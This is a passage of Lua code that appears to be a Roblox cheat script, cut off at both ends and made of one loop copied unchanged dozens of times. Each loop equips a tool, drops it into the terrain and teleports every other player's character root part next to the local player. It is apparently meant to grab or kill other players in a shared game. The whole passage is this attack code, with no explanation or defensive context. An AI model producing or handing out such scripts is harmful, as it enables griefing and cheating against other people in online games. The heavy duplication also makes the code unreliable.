  game.Players.LocalPlayer.Backpack:FindFirstChildOfClass("Tool").Parent = game.Players.LocalPlayer.Character
  
  game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Parent = game.Workspace.Terrain
  game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Parent = game.Workspace.Terrain
  wait()
  v.Character.HumanoidRootPart.CFrame = CFrame.new(game.Players.LocalPlayer.Character.HumanoidRootPart.Position + game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.rightVector)

end
wait(0.01)

end
for i, v in pairs(game.Players:GetPlayers()) do
if v and v.Name ~= game.Players.LocalPlayer.Name then
  
game.Players.LocalPlayer.Backpack:FindFirstChildOfClass("Tool").Parent = game.Players.LocalPlayer.Character
  game.Players.LocalPlayer.Backpack:FindFirstChildOfClass("Tool").Parent = game.Players.LocalPlayer.Character
  
  game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Parent = game.Workspace.Terrain
  game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Parent = game.Workspace.Terrain
  wait()
  v.Character.HumanoidRootPart.CFrame = CFrame.new(game.Players.LocalPlayer.Character.HumanoidRootPart.Position + game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.rightVector)

end
wait(0.01)

end
for i, v in pairs(game.Players:GetPlayers()) do
if v and v.Name ~= game.Players.LocalPlayer.Name then
  
game.Players.LocalPlayer.Backpack:FindFirstChildOfClass("Tool").Parent = game.Players.LocalPlayer.Character
  game.Players.LocalPlayer.Backpack:FindFirstChildOfClass("Tool").Parent = game.Players.LocalPlayer.Character
  
  game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Parent = game.Workspace.Terrain
  game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Parent = game.Workspace.Terrain
  wait()
  v.Character.HumanoidRootPart.CFrame = CFrame.new(game.Players.LocalPlayer.Character.HumanoidRootPart.Position + game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.rightVector)

end
wait(0.01)

end
for i, v in pairs(game.Players:GetPlayers()) do
if v and v.Name ~= game.Players.LocalPlayer.Name then
  
game.Players.LocalPlayer.Backpack:FindFirstChildOfClass("Tool").Parent = game.Players.LocalPlayer.Character
  game.Players.LocalPlayer.Backpack:FindFirstChildOfClass("Tool").Parent = game.Players.LocalPlayer.Character
  
  game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Parent = game.Workspace.Terrain
  game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Parent = game.Workspace.Terrain
  wait()
  v.Character.HumanoidRootPart.CFrame = CFrame.new(game.Players.LocalPlayer.Character.HumanoidRootPart.Position + game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.rightVector)

end
wait(0.01)

end
for i, v in pairs(game.Players:GetPlayers()) do
if v and v.Name ~= game.Players.LocalPlayer.Name then
  
game.Players.LocalPlayer.Backpack:FindFirstChildOfClass("Tool").Parent = game.Players.LocalPlayer.Character
  game.Players.LocalPlayer.Backpack:FindFirstChildOfClass("Tool").Parent = game.Players.LocalPlayer.Character
  
  game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Parent = game.Workspace.Terrain
  game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Parent = game.Workspace.Terrain
  wait()
  v.Character.HumanoidRootPart.CFrame = CFrame.new(game.Players.LocalPlayer.Character.HumanoidRootPart.Position + game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.rightVector)

end
wait(0.01)

end
for i, v in pairs(game.Players:GetPlayers()) do
if v and v.Name ~= game.Players.LocalPlayer.Name then
  
game.Players.LocalPlayer.Backpack:FindFirstChildOfClass("Tool").Parent = game.Players.LocalPlayer.Character
  game.Players.LocalPlayer.Backpack:FindFirstChildOfClass("Tool").Parent = game.Players.LocalPlayer.Character
  
  game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Parent = game.Workspace.Terrain
  game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Parent = game.Workspace.Terrain
  wait()
  v.Character.HumanoidRootPart.CFrame = CFrame.new(game.Players.LocalPlayer.Character.HumanoidRootPart.Position + game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.rightVector)

end
wait(0.01)

end
for i, v in pairs(game.Players:GetPlayers()) do
if v and v.Name ~= game.Players.LocalPlayer.Name then
  
game.Players.LocalPlayer.Backpack:FindFirstChildOfClass("Tool").Parent = game.Players.LocalPlayer.Character
  game.Players.LocalPlayer.Backpack:FindFirstChildOfClass("Tool").Parent = game.Players.LocalPlayer.Character
  
  game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Parent = game.Workspace.Terrain
  game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Parent = game.Workspace.Terrain
  wait()
  v.Character.HumanoidRootPart.CFrame = CFrame.new(game.Players.LocalPlayer.Character.HumanoidRootPart.Position + game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.rightVector)

end
wait(0.01)

end
for i, v in pairs(game.Players:GetPlayers()) do
if v and v.Name ~= game.Players.LocalPlayer.Name then
  
game.Players.LocalPlayer.Backpack:FindFirstChildOfClass("Tool").Parent = game.Players.LocalPlayer.Character
  game.Players.LocalPlayer.Backpack:FindFirstChildOfClass("Tool").Parent = game.Players.LocalPlayer.Character
  
  game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Parent = game.Workspace.Terrain
  game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Parent = game.Workspace.Terrain
  wait()
  v.Character.HumanoidRootPart.CFrame = CFrame.new(game.Players.LocalPlayer.Character.HumanoidRootPart.Position + game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.rightVector)

end
wait(0.01)

end
for i, v in pairs(game.Players:GetPlayers()) do
if v and v.Name ~= game.Players.LocalPlayer.Name then
  
game.Players.LocalPlayer.Backpack:FindFirstChildOfClass("Tool").Parent = game.Players.LocalPlayer.Character
  game.Players.LocalPlayer.Backpack:FindFirstChildOfClass("Tool").Parent = game.Players.LocalPlayer.Character
  
  game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Parent = game.Workspace.Terrain
  game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Parent = game.Workspace.Terrain
  wait()
  v.Character.HumanoidRootPart.CFrame = CFrame.new(game.Players.LocalPlayer.Character.HumanoidRootPart.Position + game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.rightVector)

end
wait(0.01)

end
for i, v in pairs(game.Players:GetPlayers()) do
if v and v.Name ~= game.Players.LocalPlayer.Name then
  
game.Players.LocalPlayer.Backpack:FindFirstChildOfClass("Tool").Parent = game.Players.LocalPlayer.Character
  game.Players.LocalPlayer.Backpack:FindFirstChildOfClass("Tool").Parent = game.Players.LocalPlayer.Character
  
  game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Parent = game.Workspace.Terrain
  game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Parent = game.Workspace.Terrain
  wait()
  v.Character.HumanoidRootPart.CFrame = CFrame.new(game.Players.LocalPlayer.Character.HumanoidRootPart.Position + game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.rightVector)

end
wait(0.01)

end
for i, v in pairs(game.Players:GetPlayers()) do
if v and v.Name ~= game.Players.LocalPlayer.Name then
  
game.Players.LocalPlayer.Backpack:FindFirstChildOfClass("Tool").Parent = game.Players.LocalPlayer.Character
  game.Players.LocalPlayer.Backpack:FindFirstChildOfClass("Tool").Parent = game.Players.LocalPlayer.Character
  
  game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Parent = game.Workspace.Terrain
  game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Parent = game.Workspace.Terrain
  wait()
  v.Character.HumanoidRootPart.CFrame = CFrame.new(game.Players.LocalPlayer.Character.HumanoidRootPart.Position + game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.rightVector)

end
wait(0.01)

end
for i, v in pairs(game.Players:GetPlayers()) do
if v and v.Name ~= game.Players.LocalPlayer.Name then
  
game.Players.LocalPlayer.Backpack:FindFirstChildOfClass("Tool").Parent = game.Players.LocalPlayer.Character
  game.Players.LocalPlayer.Backpack:FindFirstChildOfClass("Tool").Parent = game.Players.LocalPlayer.Character
  
  game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Parent = game.Workspace.Terrain
  game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Parent = game.Workspace.Terrain
  wait()
  v.Character.HumanoidRootPart.CFrame = CFrame.new(game.Players.LocalPlayer.Character.HumanoidRootPart.Position + game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.rightVector)

end
wait(0.01)

end
for i, v in pairs(game.Players:GetPlayers()) do
if v and v.Name ~= game.Players.LocalPlayer.Name then
  
game.Players.LocalPlayer.Backpack:FindFirstChildOfClass("Tool").Parent = game.Players.LocalPlayer.Character
  game.Players.LocalPlayer.Backpack:FindFirstChildOfClass("Tool").Parent = game.Players.LocalPlayer.Character
  
  game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Parent = game.Workspace.Terrain
  game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Parent = game.Workspace.Terrain
  wait()
  v.Character.HumanoidRootPart.CFrame = CFrame.new(game.Players.LocalPlayer.Character.HumanoidRootPart.Position + game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.rightVector)

end
wait(0.01)

end
for i, v in pairs(game.Players:GetPlayers()) do
if v and v.Name ~= game.Players.LocalPlayer.Name then
  
game.Players.LocalPlayer.Backpack:FindFirstChildOfClass("Tool").Parent = game.Players.LocalPlayer.Character
  game.Players.LocalPlayer.Backpack:FindFirstChildOfClass("Tool").Parent = game.Players.LocalPlayer.Character
  
  game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Parent = game.Workspace.Terrain
  game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Parent = game.Workspace.Terrain
  wait()
  v.Character.HumanoidRootPart.CFrame = CFrame.new(game.Players.LocalPlayer.Character.HumanoidRootPart.Position + game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.rightVector)

end
wait(0.01)

end

for i, v in pairs(game.Players:GetPlayers()) do
if v and v.Name ~= game.Players.LocalPlayer.Name then
  
game.Players.LocalPlayer.Backpack:FindFirstChildOfClass("Tool").Parent = game.Players.LocalPlayer.Character
  game.Players.LocalPlayer.Backpack:FindFirstChildOfClass("Tool").Parent = game.Players.LocalPlayer.Character
  
  game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Parent = game.Workspace.Terrain
  game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Parent = game.Workspace.Terrain
  wait()
  v.Character.HumanoidRootPart.CFrame = CFrame.new(game.Players.LocalPlayer.Character.HumanoidRootPart.Position + game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.rightVector)

end
wait(0.01)

end
for i, v in pairs(game.Players:GetPlayers()) do
if v and v.Name ~= game.Players.LocalPlayer.Name then
  
game.Players.LocalPlayer.Backpack:FindFirstChildOfClass("Tool").Parent = game.Players.LocalPlayer.Character
  game.Players.LocalPlayer.Backpack:FindFirstChildOfClass("Tool").Parent = game.Players.LocalPlayer.Character
  
  game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Parent = game.Workspace.Terrain
  game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Parent = game.Workspace.Terrain
  wait()
  v.Character.HumanoidRootPart.CFrame = CFrame.new(game.Players.LocalPlayer.Character.HumanoidRootPart.Position + game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.rightVector)

end
wait(0.01)

end
for i, v in pairs(game.Players:GetPlayers()) do
if v and v.Name ~= game.Players.LocalPlayer.Name then
  
game.Players.LocalPlayer.Backpack:FindFirstChildOfClass("Tool").Parent = game.Players.LocalPlayer.Character
  game.Players.LocalPlayer.Backpack:FindFirstChildOfClass("Tool").Parent = game.Players.LocalPlayer.Character
  
  game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Parent = game.Workspace.Terrain
  game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Parent = game.Workspace.Terrain
  wait()
  v.Character.HumanoidRootPart.CFrame = CFrame.new(game.Players.LocalPlayer.Character.HumanoidRootPart.Position + game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.rightVector)

end
wait(0.01)

end
for i, v in pairs(game.Players:GetPlayers()) do
if v and v.Name ~= game.Players.LocalPlayer.Name then
  
game.Players.LocalPlayer.Backpack:FindFirstChildOfClass("Tool").Parent = game.Players.LocalPlayer.Character
  game.Players.LocalPlayer.Backpack:FindFirstChildOfClass("Tool").Parent = game.Players.LocalPlayer.Character
  
  game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Parent = game.Workspace.Terrain
  game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Parent = game.Workspace.Terrain
  wait()
  v.Character.HumanoidRootPart.CFrame = CFrame.new(game.Players.LocalPlayer.Character.HumanoidRootPart.Position + game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.rightVector)

end
wait(0.01)

end
for i, v in pairs(game.Players:GetPlayers()) do
if v and v.Name ~= game.Players.LocalPlayer.Name then
  
game.Players.LocalPlayer.Backpack:FindFirstChildOfClass("Tool").Parent = game.Players.LocalPlayer.Character
  game.Players.LocalPlayer.Backpack:FindFirstChildOfClass("Tool").Parent = game.Players.LocalPlayer.Character
  
  game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Parent = game.Workspace.Terrain
  game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Parent = game.Workspace.Terrain
  wait()
  v.Character.HumanoidRootPart.CFrame = CFrame.new(game.Players.LocalPlayer.Character.HumanoidRootPart.Position + game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.rightVector)

end
wait(0.01)

end
for i, v in pairs(game.Players:GetPlayers()) do
if v and v.Name ~= game.Players.LocalPlayer.Name then
  
game.Players.LocalPlayer.Backpack:FindFirstChildOfClass("Tool").Parent = game.Players.LocalPlayer.Character
  game.Players.LocalPlayer.Backpack:FindFirstChildOfClass("Tool").Parent = game.Players.LocalPlayer.Character
  
  game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Parent = game.Workspace.Terrain
  game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Parent = game.Workspace.Terrain
  wait()
  v.Character.HumanoidRootPart.CFrame = CFrame.new(game.Players.LocalPlayer.Character.HumanoidRootPart.Position + game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.rightVector)

end
wait(0.01)

end
for i, v in pairs(game.Players:GetPlayers()) do
if v and v.Name ~= game.Players.LocalPlayer.Name then
  
game.Players.LocalPlayer.Backpack:FindFirstChildOfClass("Tool").Parent = game.Players.LocalPlayer.Character
  game.Players.LocalPlayer.Backpack:FindFirstChildOfClass("Tool").Parent = game.Players.LocalPlayer.Character
  
  game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Parent = game.Workspace.Terrain
  game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Parent = game.Workspace.Terrain
  wait()
  v.Character.HumanoidRootPart.CFrame = CFrame.new(game.Players.LocalPlayer.Character.HumanoidRootPart.Position + game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.rightVector)

end
wait(0.01)

end
for i, v in pairs(game.Players:GetPlayers()) do
if v and v.Name ~= game.Players.LocalPlayer.Name then
  
game.Players.LocalPlayer.Backpack:FindFirstChildOfClass("Tool").Parent = game.Players.LocalPlayer.Character
  game.Players.LocalPlayer.Backpack:FindFirstChildOfClass("Tool").Parent = game.Players.LocalPlayer.Character
  
  game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Parent = game.Workspace.Terrain
  game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Parent = game.Workspace.Terrain
  wait()
  v.Character.HumanoidRootPart.CFrame = CFrame.new(game.Players.LocalPlayer.Character.HumanoidRootPart.Position + game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.rightVector)

end
wait(0.01)

end
for i, v in pairs(game.Players:GetPlayers()) do
if v and v.Name ~= game.Players.LocalPlayer.Name then
  
game.Players.LocalPlayer.Backpack:FindFirstChildOfClass("Tool").Parent = game.Players.LocalPlayer.Character
  game.Players.LocalPlayer.Backpack:FindFirstChildOfClass("Tool").Parent = game.Players.LocalPlayer.Character
  
  game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Parent = game.Workspace.Terrain
  game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Parent = game.Workspace.Terrain
  wait()
  v.Character.HumanoidRootPart.CFrame = CFrame.new(game.Players.LocalPlayer.Character.HumanoidRootPart.Position + game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.rightVector)

end
wait(0.01)

end
for i, v in pairs(game.Players:GetPlayers()) do
if v and v.Name ~= game.Players.LocalPlayer.Name then
  
game.Players.LocalPlayer.Backpack:FindFirstChildOfClass("Tool").Parent = game.Players.LocalPlayer.Character
  game.Players.LocalPlayer.Backpack:FindFirstChildOfClass("Tool").Parent = game.Players.LocalPlayer.Character
  
  game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Parent = game.Workspace.Terrain
  game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Parent = game.Workspace.Terrain
  wait()
  v.Character.HumanoidRootPart.CFrame = CFrame.new(game.Players.LocalPlayer.Character.HumanoidRootPart.Position + game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.rightVector)

end
wait(0.01)

end
for i, v in pairs(game.Players:GetPlayers()) do
if v and v.Name ~= game.Players.LocalPlayer.Name then
  
game.Players.LocalPlayer.Backpack:FindFirstChildOfClass("Tool").Parent = game.Players.LocalPlayer.Character
  game.Players.LocalPlayer.Backpack:FindFirstChildOfClass("Tool").Parent = game.Players.LocalPlayer.Character
  
  game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Parent = game.Workspace.Terrain
  game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Parent = game.Workspace.Terrain
  wait()
  v.Character.HumanoidRootPart.CFrame = CFrame.new(game.Players.LocalPlayer.Character.HumanoidRootPart.Position + game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.rightVector)

end
wait(0.01)

end
for i, v in pairs(game.Players:GetPlayers()) do
if v and v.Name ~= game.Players.LocalPlayer.Name then
  
game.Players.LocalPlayer.Backpack:FindFirstChildOfClass("Tool").Parent = game.Players.LocalPlayer.Character
  game.Players.LocalPlayer.Backpack:FindFirstChildOfClass("Tool").Parent = game.Players.LocalPlayer.Character
  
  game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Parent = game.Workspace.Terrain
  game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Parent = game.Workspace.Terrain
  wait()
  v.Character.HumanoidRootPart.CFrame = CFrame.new(game.Players.LocalPlayer.Character.HumanoidRootPart.Position + game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.rightVector)

end
wait(0.01)

end
for i, v in pairs(game.Players:GetPlayers()) do
if v and v.Name ~= game.Players.LocalPlayer.Name then
  
game.Players.LocalPlayer.Backpack:FindFirstChildOfClass("Tool").Parent = game.Players.LocalPlayer.Character
  game.Players.LocalPlayer.Backpack:FindFirstChildOfClass("Tool").Parent = game.Players.LocalPlayer.Character
  
  game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Parent = game.Workspace.Terrain
  game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Parent = game.Workspace.Terrain
  wait()
  v.Character.HumanoidRootPart.CFrame = CFrame.new(game.Players.LocalPlayer.Character.HumanoidRootPart.Position + game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.rightVector)

end
wait(0.01)

end
for i, v in pairs(game.Players:GetPlayers()) do
if v and v.Name ~= game.Players.LocalPlayer.Name then
  
game.Players.LocalPlayer.Backpack:FindFirstChildOfClass("Tool").Parent = game.Players.LocalPlayer.Character
  game.Players.LocalPlayer.Backpack:FindFirstChildOfClass("Tool").Parent = game.Players.LocalPlayer.Character
  
  game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Parent = game.Workspace.Terrain
  game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Parent = game.Workspace.Terrain
  wait()
  v.Character.HumanoidRootPart.CFrame = CFrame.new(game.Players.LocalPlayer.Character.HumanoidRootPart.Position + game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.rightVector)

end
wait(0.01)

end
for i, v in pairs(game.Players:GetPlayers()) do
if v and v.Name ~= game.Players.LocalPlayer.Name then
  
game.Players.LocalPlayer.Backpack:FindFirstChildOfClass("Tool").Parent = game.Players.LocalPlayer.Character
  game.Players.LocalPlayer.Backpack:FindFirstChildOfClass("Tool").Parent = game.Players.LocalPlayer.Character
  
  game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Parent = game.Workspace.Terrain
  game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Parent = game.Workspace.Terrain
  wait()
  v.Character.HumanoidRootPart.CFrame = CFrame.new(game.Players.LocalPlayer.Character.HumanoidRootPart.Position + game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.rightVector)

end
wait(0.01)

end
for i, v in pairs(game.Players:GetPlayers()) do
if v and v.Name ~= game.Players.LocalPlayer.Name then
  
game.Players.LocalPlayer.Backpack:FindFirstChildOfClass("Tool").Parent = game.Players.LocalPlayer.Character
  game.Players.LocalPlayer.Backpack:FindFirstChildOfClass("Tool").Parent = game.Players.LocalPlayer.Character
  
  game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Parent = game.Workspace.Terrain
  game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Parent = game.Workspace.Terrain
  wait()
  v.Character.HumanoidRootPart.CFrame = CFrame.new(game.Players.LocalPlayer.Character.HumanoidRootPart.Position + game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.rightVector)

end
wait(0.01)

end
for i, v in pairs(game.Players:GetPlayers()) do
if v and v.Name ~= game.Players.LocalPlayer.Name then
  
game.Players.LocalPlayer.Backpack:FindFirstChildOfClass("Tool").Parent = game.Players.LocalPlayer.Character
  game.Players.LocalPlayer.Backpack:FindFirstChildOfClass("Tool").Parent = game.Players.LocalPlayer.Character
  
  game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Parent = game.Workspace.Terrain
  game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Parent = game.Workspace.Terrain
  wait()
  v.Character.HumanoidRootPart.CFrame = CFrame.new(game.Players.LocalPlayer.Character.HumanoidRootPart.Position + game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.rightVector)

end
wait(0.01)

end
for i, v in pairs(game.Players:GetPlayers()) do
if v and v.Name ~= game.Players.LocalPlayer.Name then
  
game.Players.LocalPlayer.Backpack:FindFirstChildOfClass("Tool").Parent = game.Players.LocalPlayer.Character
  game.Players.LocalPlayer.Backpack:FindFirstChildOfClass("Tool").Parent = game.Players.LocalPlayer.Character
  
  game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Parent = game.Workspace.Terrain
  game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Parent = game.Workspace.Terrain
  wait()
  v.Character.HumanoidRootPart.CFrame = CFrame.new(game.Players.LocalPlayer.Character.HumanoidRootPart.Position + game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.rightVector)

end
wait(0.01)

end
for i, v in pairs(game.Players:GetPlayers()) do
if v and v.Name ~= game.Players.LocalPlayer.Name then
  
game.Players.LocalPlayer.Backpack:FindFirstChildOfClass("Tool").Parent = game.Players.LocalPlayer.Character
  game.Players.LocalPlayer.Backpack:FindFirstChildOfClass("Tool").Parent = game.Players.LocalPlayer.Character
  
  game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Parent = game.Workspace.Terrain
  game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Parent = game.Workspace.Terrain
  wait()
  v.Character.HumanoidRootPart.CFrame = CFrame.new(game.Players.LocalPlayer.Character.HumanoidRootPart.Position + game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.rightVector)

end
wait(0.01)

end
for i, v in pairs(game.Players:GetPlayers()) do
if v and v.Name ~= game.Players.LocalPlayer.Name then
  
game.Players.LocalPlayer.Backpack:FindFirstChildOfClass("Tool").Parent = game.Players.LocalPlayer.Character
  game.Players.LocalPlayer.Backpack:FindFirstChildOfClass("Tool").Parent = game.Players.LocalPlayer.Character
  
  game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Parent = game.Workspace.Terrain
  game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Parent = game.Workspace.Terrain
  wait()
  v.Character.HumanoidRootPart.CFrame = CFrame.new(game.Players.LocalPlayer.Character.HumanoidRootPart.Position + game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.rightVector)

end
wait(0.01)

end
for i, v in pairs(game.Players:GetPlayers()) do
if v and v.Name ~= game.Players.LocalPlayer.Name then
  
game.Players.LocalPlayer.Backpack:FindFirstChildOfClass("Tool").Parent = game.Players.LocalPlayer.Character
  game.Players.LocalPlayer.Backpack:FindFirstChildOfClass("Tool").Parent = game.Players.LocalPlayer.Character
  
  game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Parent = game.Workspace.Terrain
  game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Parent = game.Workspace.Terrain
  wait()
  v.Character.HumanoidRootPart.CFrame = CFrame.new(game.Players.LocalPlayer.Character.HumanoidRootPart.Position + game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.rightVector)

end
wait(0.01)

end
for i, v in pairs(game.Players:GetPlayers()) do
if v and v.Name ~= game.Players.LocalPlayer.Name then
  
game.Players.LocalPlayer.Backpack:FindFirstChildOfClass("Tool").Parent = game.Players.LocalPlayer.Character
  game.Players.LocalPlayer.Backpack:FindFirstChildOfClass("Tool").Parent = game.Players.LocalPlayer.Character
  
  game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Parent = game.Workspace.Terrain
  game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Parent = game.Workspace.Terrain
  wait()
  v.Character.HumanoidRootPart.CFrame = CFrame.new(game.Players.LocalPlayer.Character.HumanoidRootPart.Position + game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.rightVector)

end
wait(0.01)

end
for i, v in pairs(game.Players:GetPlayers()) do
if v and v.Name ~= game.Players.LocalPlayer.Name then
  
game.Players.LocalPlayer.Backpack:FindFirstChildOfClass("Tool").Parent = game.Players.LocalPlayer.Character
  game.Players.LocalPlayer.Backpack:FindFirstChildOfClass("Tool").Parent = game.Players.LocalPlayer.Character
  
  game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Parent = game.Workspace.Terrain
  game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Parent = game.Workspace.Terrain
  wait()
  v.Character.HumanoidRootPart.CFrame = CFrame.new(game.Players.LocalPlayer.Character.HumanoidRootPart.Position + game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.rightVector)

end
wait(0.01)

end
for i, v in pairs(game.Players:GetPlayers()) do
if v and v.Name ~= game.Players.LocalPlayer.Name then
  
game.Players.LocalPlayer.Backpack:FindFirstChildOfClass("Tool").Parent = game.Players.LocalPlayer.Character
  game.Players.LocalPlayer.Backpack:FindFirstChildOfClass("Tool").Parent = game.Players.LocalPlayer.Character
  
  game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Parent = game.Workspace.Terrain
  game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Parent = game.Workspace.Terrain
  wait()
  v.Character.HumanoidRootPart.CFrame = CFrame.new(game.Players.LocalPlayer.Character.HumanoidRootPart.Position + game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.rightVector)

end
wait(0.01)

end
for i, v in pairs(game.Players:GetPlayers()) do
if v and v.Name ~= game.Players.LocalPlayer.Name then
  
game.Players.LocalPlayer.Backpack:FindFirstChildOfClass("Tool").Parent = game.Players.LocalPlayer.Character
  game.Players.LocalPlayer.Backpack:FindFirstChildOfClass("Tool").Parent = game.Players.LocalPlayer.Character
  
  game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Parent = game.Workspace.Terrain
  game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Parent = game.Workspace.Terrain
  wait()
  v.Character.HumanoidRootPart.CFrame = CFrame.new(game.Players.LocalPlayer.Character.HumanoidRootPart.Position + game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.rightVector)

end
wait(0.01)

end
for i, v in pairs(game.Players:GetPlayers()) do
if v and v.Name ~= game.Players.LocalPlayer.Name then
  
game.Players.LocalPlayer.Backpack:FindFirstChildOfClass("Tool").Parent = game.Players.LocalPlayer.Character
  game.Players.LocalPlayer.Backpack:FindFirstChildOfClass("Tool").Parent = game.Players.LocalPlayer.Character
  
  game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Parent = game.Workspace.Terrain
  game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Parent = game.Workspace.Terrain
  wait()
  v.Character.HumanoidRootPart.CFrame = CFrame.new(game.Players.LocalPlayer.Character.HumanoidRootPart.Position + game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.rightVector)

end
wait(0.01)

end
for i, v in pairs(game.Players:GetPlayers()) do
if v and v.Name ~= game.Players.LocalPlayer.Name then
  
game.Players.LocalPlayer.Backpack:FindFirstChildOfClass("Tool").Parent = game.Players.LocalPlayer.Character
  game.Players.LocalPlayer.Backpack:FindFirstChildOfClass("Tool").Parent = game.Players.LocalPlayer.Character
  
